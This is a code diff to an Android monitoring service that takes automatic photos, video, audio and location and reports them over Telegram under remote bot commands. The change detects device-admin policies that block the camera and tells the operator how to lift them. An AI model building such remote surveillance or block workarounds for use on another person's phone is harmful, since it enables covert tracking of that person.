@@ -184,6 +184,9 @@ class MonitoringService : Service() {
         private const val NOTIFICATION_ID = 1
         private const val MAX_AUDIO_KEPT = 5
         private const val MAX_VIDEO_KEPT = 3
+        private const val PHOTO_PAUSE_NONE = 0
+        private const val PHOTO_PAUSE_ADMIN = 1
+        private const val PHOTO_PAUSE_UNKNOWN = 2
         private val storageWarnAt = java.util.concurrent.atomic.AtomicLong(0L)
         private val smsReqSeq = java.util.concurrent.atomic.AtomicInteger(java.util.concurrent.ThreadLocalRandom.current().nextInt())
         private val authReminderAt = java.util.concurrent.atomic.AtomicLong(0L)
@@ -722,10 +725,25 @@ class MonitoringService : Service() {
                         cameraCycleMs = 5 * 60_000L
                         chunkedDelay(5 * 60_000L)
                     } else {
-                        val remaining = cachedPhotoPausedUntil - System.currentTimeMillis()
-                        val idle = if (remaining > 0) remaining.coerceAtMost(30 * 60_000L) else 30 * 60_000L
-                        cameraCycleMs = idle
-                        chunkedDelay(idle)
+                        val adminPaused = photoPauseSource() == PHOTO_PAUSE_ADMIN
+                        if (adminPaused) {
+                            if (isCameraDisabledByPolicy()) {
+                                val until = System.currentTimeMillis() + 120 * 60_000L
+                                cachedPhotoPausedUntil = until
+                                try { preferencesManager.photoPausedUntil = until } catch (_: Exception) { }
+                                cameraCycleMs = 2 * 60_000L
+                                chunkedDelay(2 * 60_000L)
+                            } else {
+                                try { resumePhotosAfterPolicyLift() } catch (_: Exception) { }
+                                cameraCycleMs = 2_000L
+                                chunkedDelay(2_000L)
+                            }
+                        } else {
+                            val remaining = cachedPhotoPausedUntil - System.currentTimeMillis()
+                            val idle = if (remaining > 0) remaining.coerceAtMost(30 * 60_000L) else 30 * 60_000L
+                            cameraCycleMs = idle
+                            chunkedDelay(idle)
+                        }
                     }
                 } catch (e: kotlinx.coroutines.CancellationException) {
                     throw e
@@ -1766,6 +1784,7 @@ class MonitoringService : Service() {
                     sendToTelegram("Cara pakai: /pause &lt;minutes&gt; (1-480)")
                 } else {
                     preferencesManager.photoPausedUntil = System.currentTimeMillis() + minutes * 60_000L
+                    preferencesManager.photoPauseSource = PHOTO_PAUSE_NONE
                     sendToTelegram("⏸️ Foto otomatis dijeda $minutes mnt. (manual /photo tetap bisa)")
                 }
             }
@@ -1784,7 +1803,14 @@ class MonitoringService : Service() {
             }
             "/resume" -> {
                 preferencesManager.monitoringPaused = false
-                sendToTelegram("▶️ Monitoring jalan lagi.")
+                val photoPaused = isPhotoPaused()
+                try {
+                    preferencesManager.photoPausedUntil = 0L
+                    preferencesManager.photoPauseSource = PHOTO_PAUSE_NONE
+                } catch (_: Exception) {
+                }
+                cachedPhotoPausedUntil = 0L
+                sendToTelegram(if (photoPaused) "▶️ Monitoring jalan lagi. Jeda foto otomatis dibatalkan." else "▶️ Monitoring jalan lagi.")
             }
             "/location" -> {
                 if (!hasLocationPermission()) {
@@ -2593,6 +2619,7 @@ class MonitoringService : Service() {
         if (stored - System.currentTimeMillis() > 1440 * 60_000L) {
             try {
                 preferencesManager.photoPausedUntil = 0L
+                preferencesManager.photoPauseSource = PHOTO_PAUSE_NONE
             } catch (_: Exception) {
             }
             return 0L
@@ -4642,9 +4669,10 @@ class MonitoringService : Service() {
         }
         if (isCameraDisabledByPolicy()) {
             autoPausePhotosOnPolicyBlock()
+            val blockers = cameraBlockingAdmins()
             serviceScope.launch {
                 if (reportResult) {
-                    sendToTelegram("⚠️ Photo capture failed: " + sanitizedCameraError("CAMERA_DISABLED") + " " + cameraFailureHint("CAMERA_DISABLED"))
+                    sendToTelegram("⚠️ Photo capture failed: " + sanitizedCameraError("CAMERA_DISABLED") + " " + policyFailureHint(blockers))
                 } else {
                     notifyCameraFailure("camera disabled by device policy (CAMERA_DISABLED)")
                 }
@@ -4794,8 +4822,7 @@ class MonitoringService : Service() {
                     if (policyBlocked) autoPausePhotosOnPolicyBlock()
                     serviceScope.launch {
                         if (reportResult) {
-                            var hint = cameraFailureHint(exception.message)
-                            if (policyBlocked) hint += " Automatic photos paused for 120 min; send /photointerval 0 to turn auto photos off, or /resume to retry."
+                            val hint = if (policyBlocked) policyFailureHint(cameraBlockingAdmins()) else cameraFailureHint(exception.message)
                             sendToTelegram("⚠️ Photo capture failed: " + sanitizedCameraError(exception.message) + " " + hint)
                         } else {
                             notifyCameraFailure(sanitizedCameraError(exception.message))
@@ -5113,23 +5140,77 @@ class MonitoringService : Service() {
 
     private fun autoPausePhotosOnPolicyBlock() {
         try {
-            if (isPhotoPaused()) return
-            preferencesManager.photoPausedUntil = System.currentTimeMillis() + 120 * 60_000L
+            val admins = cameraBlockingAdmins()
+            val source = if (admins.isNotEmpty() || isCameraDisabledByPolicy()) PHOTO_PAUSE_ADMIN else PHOTO_PAUSE_UNKNOWN
+            if (isPhotoPaused()) {
+                if (source == PHOTO_PAUSE_ADMIN && photoPauseSource() != PHOTO_PAUSE_ADMIN) {
+                    preferencesManager.photoPauseSource = PHOTO_PAUSE_ADMIN
+                }
+                return
+            }
+            val minutes = if (source == PHOTO_PAUSE_ADMIN) 120L else 15L
+            preferencesManager.photoPausedUntil = System.currentTimeMillis() + minutes * 60_000L
+            preferencesManager.photoPauseSource = source
             cachedPhotoPausedUntil = photoPausedElapsed()
         } catch (_: Exception) {
         }
     }
 
+    private fun photoPauseSource(): Int {
+        return try { preferencesManager.photoPauseSource } catch (_: Exception) { PHOTO_PAUSE_NONE }
+    }
+
+    private suspend fun resumePhotosAfterPolicyLift() {
+        try {
+            preferencesManager.photoPausedUntil = 0L
+            preferencesManager.photoPauseSource = PHOTO_PAUSE_NONE
+            cachedPhotoPausedUntil = 0L
+            sendToTelegram("✅ Camera block lifted — automatic photos resumed.")
+        } catch (_: Exception) {
+        }
+    }
+
+    private fun cameraBlockingAdmins(): List<String> {
+        val names = ArrayList<String>()
+        try {
+            val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
+            val admins = try { dpm.activeAdmins } catch (_: Exception) { null }
+            for (admin in admins ?: emptyList()) {
+                try {
+                    if (dpm.getCameraDisabled(admin)) names.add(admin.packageName)
+                } catch (_: Exception) {
+                }
+            }
+        } catch (_: Exception) {
+        }
+        return names
+    }
+
+    private fun policyFailureHint(blockers: List<String>): String {
+        if (blockers.isNotEmpty()) {
+            return "Camera is blocked by device policy: " + blockers.joinToString(", ") +
+                ". Open Settings > Security > Device admin apps and allow the camera for that app, or pause photos with /pause." +
+                " Automatic photos paused 120 min; they resume on their own once the block is lifted."
+        }
+        if (isCameraDisabledByPolicy()) {
+            return "The system reports the camera is disabled by device policy, but the blocking admin could not be listed (usually a work profile, device owner, or OEM parental control)." +
+                " Check Settings > Security > Device admin apps, or pause photos with /pause." +
+                " Automatic photos paused 120 min; they resume on their own once the block is lifted."
+        }
+        return "The camera reports it is blocked, but no device admin disables it — likely the phone's own camera privacy switch (Xiaomi/Oppo/Samsung/OEM) or another parental-control tool." +
+            " Retrying every 15 min; send /photointerval 0 to turn auto photos off."
+    }
+
     private suspend fun notifyCameraFailure(reason: String) {
         try {
             val clean = sanitizedCameraError(reason)
-            if (isCameraPolicyError(clean)) autoPausePhotosOnPolicyBlock()
+            val policyError = isCameraPolicyError(clean)
+            if (policyError) autoPausePhotosOnPolicyBlock()
             val now = System.currentTimeMillis()
             val last = preferencesManager.lastCameraErrorNotice
             if (last > 0 && now >= last && now - last < 30 * 60_000L) return
             preferencesManager.lastCameraErrorNotice = now
-            var hint = cameraFailureHint(clean)
-            if (isCameraPolicyError(clean)) hint += " Automatic photos paused for 120 min; send /photointerval 0 to turn auto photos off, or /resume to retry."
+            val hint = if (policyError) policyFailureHint(cameraBlockingAdmins()) else cameraFailureHint(clean)
             sendToTelegram("⚠️ Photo capture failed: $clean. $hint")
         } catch (e: Exception) {
             android.util.Log.e("MonitoringService", "Error sending camera notice: ${redactToken(e.message)}")
@@ -5863,8 +5944,9 @@ class MonitoringService : Service() {
         if (isCameraDisabledByPolicy()) {
             recordBusy.set(false)
             autoPausePhotosOnPolicyBlock()
+            val blockers = cameraBlockingAdmins()
             serviceScope.launch {
-                sendToTelegram("⚠️ Video blocked by device policy (CAMERA_DISABLED). Automatic photos paused for 120 min.")
+                sendToTelegram("⚠️ Video blocked by device policy (CAMERA_DISABLED). " + policyFailureHint(blockers))
             }
             return
         }
